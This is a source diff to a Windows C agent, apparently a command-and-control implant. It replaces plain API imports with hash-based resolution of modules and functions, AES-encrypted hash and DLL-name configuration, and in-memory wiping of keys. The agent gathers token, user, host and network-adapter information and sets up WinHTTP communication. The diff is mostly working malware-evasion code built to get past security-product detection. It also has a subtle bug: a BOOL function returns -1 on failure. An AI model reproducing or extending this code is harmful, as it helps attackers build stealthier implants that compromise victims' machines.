@@ -6,6 +6,7 @@
 #include "Helpers.h"
 #include "token.h"
 #include "ListManager.h"
+#include "evasive.h"
 
 #ifdef CONFIG_BYTES
 BYTE AgentConfigBytes[] = CONFIG_BYTES;
@@ -17,15 +18,20 @@ BYTE ConfigIVBytes[] = CONFIG_IV_BYTES;
 BYTE ConfigKeyBytes[] = CONFIG_KEY_BYTES;
 #endif
 
+#ifdef HASH_CONFIG_BYTES
+BYTE HashConfigBytes[] = HASH_CONFIG_BYTES;
+#endif
+#ifdef HASH_IV_BYTES
+BYTE HashIVBytes[] = HASH_IV_BYTES;
+#endif
+#ifdef HASH_KEY_BYTES
+BYTE HashKeyBytes[] = HASH_KEY_BYTES;
+#endif
+
+UINT64 DllHashes[2] = { 0 };
+UINT64 ApiHashes[30] = { 0 };
+
 INT init_agent() {
-
-    INT ERR;
-	agent->apis = (pWin32)LocalAlloc(LPTR, sizeof(Win32));
-	if (!agent->apis) {
-		printf("[error] attempting to allocate memory for win32 apis\n");
-		return -1;
-	}
-
 
 
 #ifdef _WIN64
@@ -34,151 +40,135 @@ INT init_agent() {
     agent->pTeb = (void*)__readfsdword(0x18);
 #endif
 
-    //TODO needs to be cleaned up. The LoadLibrary call needs to be resolved using a K32 lookup module pointer function using the PEB as a base reference & a hash of the module name.
+    // printhashes();  // after we've received the function pointers we can print the hashes of the function names. TODO remove for production only needed while developing.
 
-    agent->apis->hAdvapi32 = LoadLibraryA("advapi32.dll");
-    if(agent->apis->hAdvapi32 == NULL){
-		return -1;
-	}
-    agent->apis->hWinHttp = LoadLibraryA("winhttp.dll");
-    if(agent->apis->hWinHttp == NULL){
+    if (!ParseHashConfig()) {
         return -1;
     }
-    agent->apis->hUser32 = LoadLibraryA("User32.dll");
-    if (agent->apis->hWinHttp == NULL) {
-        return -1;
-    }
-    agent->apis->hIphlpapi = LoadLibraryA("iphlpapi.dll");
-    if(agent->apis->hIphlpapi == NULL) {
-        return -1;
-    }
-
     
 
     //obtain winhttp apis
     //NEEDS TO be resolved using a hash of the function name.
-    agent->apis->pWinHttpAddRequestHeaders = (t_WinHttpAddRequestHeaders)GetProcAddress(agent->apis->hWinHttp, "WinHttpAddRequestHeaders");
-    if (agent->apis->pWinHttpAddRequestHeaders == NULL) {
-        return -1;
-    }
-    agent->apis->pWinHttpConnect = (t_WinHttpConnect)GetProcAddress(agent->apis->hWinHttp, "WinHttpConnect");
-    if (!agent->apis->pWinHttpConnect) {
-        return -1;
-    }
-    agent->apis->pWinHttpOpen = (t_WinHttpOpen)GetProcAddress(agent->apis->hWinHttp, "WinHttpOpen");
+    agent->apis->pWinHttpOpen = (t_WinHttpOpen)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[0]);
     if (!agent->apis->pWinHttpOpen) {
         return -1;
     }
-    agent->apis->pWinHttpOpenRequest = (t_WinHttpOpenRequest)GetProcAddress(agent->apis->hWinHttp, "WinHttpOpenRequest");
+    agent->apis->pWinHttpConnect = (t_WinHttpConnect)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[1]);
+    if (!agent->apis->pWinHttpConnect) {
+        return -1;
+    }
+    agent->apis->pWinHttpOpenRequest = (t_WinHttpOpenRequest)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[2]);
     if (!agent->apis->pWinHttpOpenRequest) {
         return -1;
     }
-    agent->apis->pWinHttpQueryHeaders = (t_WinHttpQueryHeaders)GetProcAddress(agent->apis->hWinHttp, "WinHttpQueryHeaders");
-    if (!agent->apis->pWinHttpQueryHeaders) {
-        return -1;
-    }
-    agent->apis->pWinHttpReceiveResponse = (t_WinHttpReceiveResponse)GetProcAddress(agent->apis->hWinHttp, "WinHttpReceiveResponse");
-    if (!agent->apis->pWinHttpReceiveResponse) {
-        return -1;
-    }
-    agent->apis->pWinHttpSetOption = (t_WinHttpSetOption)GetProcAddress(agent->apis->hWinHttp, "WinHttpSetOption");
-    if (!agent->apis->pWinHttpSetOption) {
-        return -1;
-    }
-    agent->apis->pWinHttpSendRequest = (t_WinHttpSendRequest)GetProcAddress(agent->apis->hWinHttp, "WinHttpSendRequest");
+    agent->apis->pWinHttpSendRequest = (t_WinHttpSendRequest)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[3]);
     if (!agent->apis->pWinHttpSendRequest) {
         return -1;
     }
-	agent->apis->pWinHttpReadData = (t_WinHttpReadData)GetProcAddress(agent->apis->hWinHttp, "WinHttpReadData");
+    agent->apis->pWinHttpSetOption = (t_WinHttpSetOption)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[4]);
+    if (!agent->apis->pWinHttpSetOption) {
+        return -1;
+    }
+	agent->apis->pWinHttpAddRequestHeaders = (t_WinHttpAddRequestHeaders)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[5]);
+    if (agent->apis->pWinHttpAddRequestHeaders == NULL) {
+        return -1;
+    }
+    agent->apis->pWinHttpReceiveResponse = (t_WinHttpReceiveResponse)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[6]);
+    if (!agent->apis->pWinHttpReceiveResponse) {
+        return -1;
+    }
+    agent->apis->pWinHttpQueryHeaders = (t_WinHttpQueryHeaders)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[7]);
+    if (!agent->apis->pWinHttpQueryHeaders) {
+        return -1;
+    }
+	agent->apis->pWinHttpReadData = (t_WinHttpReadData)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[8]);
     if (!agent->apis->pWinHttpReadData) {
         return -1;
     }
-	agent->apis->pWinHttpCloseHandle = (t_WinHttpCloseHandle)GetProcAddress(agent->apis->hWinHttp, "WinHttpCloseHandle");
+	agent->apis->pWinHttpCloseHandle = (t_WinHttpCloseHandle)RetrieveFunctionPointerFromhash(agent->apis->hWinHttp, ApiHashes[9]);
 	if (!agent->apis->pWinHttpCloseHandle) {
 		return -1;
 	}
 
     //obtain ntdll apis
-    agent->apis->pRtlGetVersion = (t_RtlGetVersion)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlGetVersion");
+    agent->apis->pRtlGetVersion = (t_RtlGetVersion)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[10]);
     if (!agent->apis->pRtlGetVersion) {
         return -1;
     }
-    agent->apis->pNtClose = (t_NtClose)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");
+    agent->apis->pNtClose = (t_NtClose)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[11]);
     if (!agent->apis->pNtClose) {
         return -1;
     }
-    agent->apis->pNtOpenProcessToken = (t_NtOpenProcessToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenProcessToken");
+    agent->apis->pNtOpenProcessToken = (t_NtOpenProcessToken)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[12]);
     if (!agent->apis->pNtOpenProcessToken) {
         return -1;
     }
-    agent->apis->pNtOpenThreadToken = (t_NtOpenThreadToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenThreadToken");
+    agent->apis->pNtOpenThreadToken = (t_NtOpenThreadToken)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[13]);
     if (!agent->apis->pNtOpenThreadToken) {
         return -1;
     }
-    agent->apis->pNtQueryInformationToken = (t_NtQueryInformationToken)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationToken");
+    agent->apis->pNtQueryInformationToken = (t_NtQueryInformationToken)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[14]);
     if (!agent->apis->pNtQueryInformationToken) {
         return -1;
     }
-    agent->apis->pRtlAllocateHeap = (t_RtlAllocateHeap)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlAllocateHeap");
+    agent->apis->pRtlAllocateHeap = (t_RtlAllocateHeap)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[15]);
     if (!agent->apis->pRtlAllocateHeap) {
         return -1;
     }
-    agent->apis->pRtlReAllocateHeap = (t_RtlReAllocateHeap)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlReAllocateHeap");
+    agent->apis->pRtlReAllocateHeap = (t_RtlReAllocateHeap)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[16]);
     if (!agent->apis->pRtlReAllocateHeap) {
         return -1;
     }
-	agent->apis->pRtlRandomEx = (t_RtlRandomEx)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlRandomEx");
+	agent->apis->pRtlRandomEx = (t_RtlRandomEx)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[17]);
 	if (!agent->apis->pRtlRandomEx) {
 		return -1;
 	}
-	agent->apis->pNtGetTickCount = (t_NtGetTickCount)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtGetTickCount");
+	agent->apis->pNtGetTickCount = (t_NtGetTickCount)RetrieveFunctionPointerFromhash(agent->apis->hNtdll, ApiHashes[18]);
     if (!agent->apis->pNtGetTickCount) {
         return -1;
     }
 
+    //obtain iphlpapi apis
+    agent->apis->pGetAdaptersInfo = (t_GetAdaptersInfo)RetrieveFunctionPointerFromhash(agent->apis->hIphlpapi, ApiHashes[19]);
+    if (!agent->apis->pGetAdaptersInfo) {
+        return -1;
+    }
+
+
+    //obtain advapi32 apis
+    agent->apis->pGetUserNameA = (t_GetUserNameA)RetrieveFunctionPointerFromhash(agent->apis->hAdvapi32, ApiHashes[20]);
+    if (!agent->apis->pGetUserNameA) {
+        return -1;
+    }
+
     //obtain kernel32 apis
-    agent->apis->pGetComputerNameExA = (t_GetComputerNameExA)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetComputerNameExA");
+    agent->apis->pGetComputerNameExA = (t_GetComputerNameExA)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[21]);
     if (!agent->apis->pGetComputerNameExA) {
         return -1;
     }
-	agent->apis->pLocalAlloc = (t_LocalAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LocalAlloc");
-	if (!agent->apis->pLocalAlloc) {
-		return -1;
-	}
-	agent->apis->pLocalReAlloc = (t_LocalReAlloc)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LocalReAlloc");
+
+	agent->apis->pLocalReAlloc = (t_LocalReAlloc)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[23]);
 	if (!agent->apis->pLocalReAlloc) {
 		return -1;
 	}
-	agent->apis->pLocalFree = (t_LocalFree)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LocalFree");
-    if (!agent->apis->pLocalFree) {
+
+    agent->apis->pGetLocalTime = (t_GetLocalTime)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[27]);
+    if (!agent->apis->pGetLocalTime) {
         return -1;
     }
-    agent->apis->pGetSystemTimeAsFileTime = (t_GetSystemTimeAsFileTime)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetSystemTimeAsFileTime");
+    agent->apis->pGetSystemTimeAsFileTime = (t_GetSystemTimeAsFileTime)RetrieveFunctionPointerFromhash(agent->apis->hKernel32, ApiHashes[28]);
 	if (!agent->apis->pGetSystemTimeAsFileTime) {
-		return -1;
-	}
-	agent->apis->pGetLocalTime = (t_GetLocalTime)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetLocalTime");
-	if (!agent->apis->pGetLocalTime) {
 		return -1;
 	}
 
     //obtain user32 apis
-    agent->apis->pGetSystemMetrics = (t_GetSystemMetrics)GetProcAddress(GetModuleHandleA("user32.dll"), "GetSystemMetrics");
+    agent->apis->pGetSystemMetrics = (t_GetSystemMetrics)RetrieveFunctionPointerFromhash(agent->apis->hUser32, ApiHashes[29]);
     if(!agent->apis->pGetSystemMetrics){
         return -1;
     }
 
-    //obtain advapi32 apis
-    agent->apis->pGetUserNameA = (t_GetUserNameA)GetProcAddress(agent->apis->hAdvapi32, "GetUserNameA");
-    if(!agent->apis->pGetUserNameA){
-		return -1;
-	}
-
-	//obtain iphlpapi apis
-	agent->apis->pGetAdaptersInfo = (t_GetAdaptersInfo)GetProcAddress(agent->apis->hIphlpapi, "GetAdaptersInfo");
-    if(!agent->apis->pGetAdaptersInfo){
-		return -1;
-	}
+	RtlSecureZeroMemory(ApiHashes, sizeof(ApiHashes));
+	RtlSecureZeroMemory(DllHashes, sizeof(DllHashes));
 
     agent->Context = (PContextInfo)agent->apis->pLocalAlloc(LPTR, sizeof(ContextInfo));
     if (!agent->Context) {
@@ -191,6 +181,7 @@ INT init_agent() {
 		printf("[error] attempting to allocate memory for session\n");
 		return -1;
 	}
+
 
 #if _WIN64
     agent->Context->OS_Arch = PROCESSOR_ARCHITECTURE_AMD64;
@@ -269,11 +260,12 @@ INT ParseConfig() {
     INT Length = 0;
 
     NewParser(&parser, AgentConfigBytes, sizeof(AgentConfigBytes));
-	RtlSecureZeroMemory(AgentConfigBytes, sizeof(AgentConfigBytes)); //clear the config buffer from memory we've copied it to the parser.
+
+	MemorySet(AgentConfigBytes,0, sizeof(AgentConfigBytes)); //clear the config buffer from memory we've copied it to the parser.
 
 	ParserDecrypt(&parser, ConfigKeyBytes, ConfigIVBytes);
-	RtlSecureZeroMemory(ConfigKeyBytes, sizeof(ConfigKeyBytes)); //clear the key from memory we've used it to decrypt the config.
-	RtlSecureZeroMemory(ConfigIVBytes, sizeof(ConfigIVBytes)); //clear the iv from memory we've used it to decrypt the config.
+    MemorySet(ConfigKeyBytes,0, sizeof(ConfigKeyBytes)); //clear the key from memory we've used it to decrypt the config.
+    MemorySet(ConfigIVBytes,0, sizeof(ConfigIVBytes)); //clear the iv from memory we've used it to decrypt the config.
 
 	agent->config = (PAgentConfig)agent->apis->pLocalAlloc(LPTR, sizeof(AgentConfig));
     if (!agent->config) {
@@ -347,4 +339,98 @@ INT ParseConfig() {
 	agent->config->RSAPubKeySize = Length;
 
     return 0;
+}
+
+
+BOOL ParseHashConfig() {
+    AESCTR(HashConfigBytes, sizeof(HashConfigBytes), HashKeyBytes, sizeof(HashKeyBytes), HashIVBytes);
+    for (int i = 0; i < 2; i++) {
+        MemoryCopy(&DllHashes[i], HashConfigBytes + (i * sizeof(UINT64)), sizeof(UINT64));
+    }
+    for (int i = 0; i < 30; i++) {
+        MemoryCopy(&ApiHashes[i], HashConfigBytes + ((i + 2) * sizeof(UINT64)), sizeof(UINT64));
+    }
+    HMODULE k32 = RetrieveModuleHandleFromHash(DllHashes[0]);
+    if (k32 == INVALID_HANDLE_VALUE)
+    {
+        printf("[error] attempting to retrieve kernel32 module handle\n");
+        return -1;
+    }
+    HMODULE ntdll = RetrieveModuleHandleFromHash(DllHashes[1]);
+    if (ntdll == INVALID_HANDLE_VALUE) {
+        printf("[error] attempting to retrieve ntdll module handle\n");
+        return -1;
+    }
+
+    t_LocalAlloc pLocalAlloc = RetrieveFunctionPointerFromhash(k32, ApiHashes[22]);
+    if (pLocalAlloc == NULL) {
+        printf("[error] attempting to retrieve LocalAlloc function pointer\n");
+        return -1;
+    }
+
+    INT ERR;
+    agent->apis = (pWin32)pLocalAlloc(LPTR, sizeof(Win32));
+    if (!agent->apis) {
+        printf("[error] attempting to allocate memory for win32 apis\n");
+        return -1;
+    }
+    agent->apis->pLocalAlloc = pLocalAlloc;
+    agent->apis->hKernel32 = k32;
+    agent->apis->hNtdll = ntdll;
+    agent->apis->pLoadLibraryA = (t_LoadLibraryA)RetrieveFunctionPointerFromhash(k32, ApiHashes[25]);
+    agent->apis->pLocalFree = (t_LocalFree)RetrieveFunctionPointerFromhash(k32, ApiHashes[24]);
+	agent->apis->pGetProcAddress = (t_GetProcAddress)RetrieveFunctionPointerFromhash(k32, ApiHashes[26]);
+
+    //TODO needs to be cleaned up. The LoadLibrary call needs to be resolved using a K32 lookup module pointer function using the PEB as a base reference & a hash of the module name.
+    UINT Length = 0;
+    UINT TotalLength = 0;
+    MemoryCopy(&Length, HashConfigBytes + (32 * sizeof(UINT64)), sizeof(UINT));
+    LPSTR Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length);
+    MemoryCopy(Buffer, HashConfigBytes + (32 * sizeof(UINT64) + sizeof(UINT)), Length);
+    agent->apis->hAdvapi32 = agent->apis->pLoadLibraryA(Buffer);
+    if (agent->apis->hAdvapi32 == NULL) {
+        return -1;
+    }
+    TotalLength += Length + sizeof(UINT);
+	RtlSecureZeroMemory(Buffer, Length);
+    agent->apis->pLocalFree(Buffer);
+
+    MemoryCopy(&Length, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength), sizeof(UINT));
+    Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length);
+    MemoryCopy(Buffer, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength + sizeof(UINT)), Length);
+    agent->apis->hWinHttp = agent->apis->pLoadLibraryA(Buffer);
+    if (agent->apis->hWinHttp == NULL) {
+        return -1;
+    }
+    TotalLength += Length + sizeof(UINT);
+	RtlSecureZeroMemory(Buffer, Length);
+    agent->apis->pLocalFree(Buffer);
+
+    MemoryCopy(&Length, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength), sizeof(UINT));
+    Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length);
+    MemoryCopy(Buffer, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength + sizeof(UINT)), Length);
+    agent->apis->hUser32 = agent->apis->pLoadLibraryA(Buffer);
+    if (agent->apis->hUser32 == NULL) {
+        return -1;
+    }
+    TotalLength += Length + sizeof(UINT);
+	RtlSecureZeroMemory(Buffer, Length);
+    agent->apis->pLocalFree(Buffer);
+
+    MemoryCopy(&Length, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength), sizeof(UINT));
+    Buffer = (LPSTR)agent->apis->pLocalAlloc(LPTR, Length);
+    MemoryCopy(Buffer, HashConfigBytes + (32 * sizeof(UINT64) + TotalLength + sizeof(UINT)), Length);
+    agent->apis->hIphlpapi = agent->apis->pLoadLibraryA(Buffer);
+    if (agent->apis->hIphlpapi == NULL) {
+        return -1;
+    }
+    TotalLength += Length + sizeof(UINT);
+	RtlSecureZeroMemory(Buffer, Length);
+    agent->apis->pLocalFree(Buffer);
+
+    RtlSecureZeroMemory(HashConfigBytes, sizeof(HashConfigBytes));
+    RtlSecureZeroMemory(HashKeyBytes, sizeof(HashKeyBytes));
+    RtlSecureZeroMemory(HashIVBytes, sizeof(HashIVBytes));
+
+    return TRUE;
 }
